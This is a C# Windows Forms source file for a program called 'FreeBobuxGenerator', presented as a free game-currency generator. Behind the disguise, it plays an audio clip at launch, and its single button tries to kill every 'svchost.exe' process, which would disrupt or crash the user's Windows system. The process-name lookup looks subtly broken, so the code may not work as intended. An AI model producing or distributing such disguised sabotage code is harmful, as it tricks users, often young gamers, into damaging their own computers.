using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FreeBobuxGenerator
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            SoundPlayer audio = new SoundPlayer(FreeBobuxGenerator.Properties.Resources.candyland); // plays candyland low quality
            audio.Play();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcessesByName("svchost.exe"))
            {  
                process.Kill();
            }
        }
    }
}
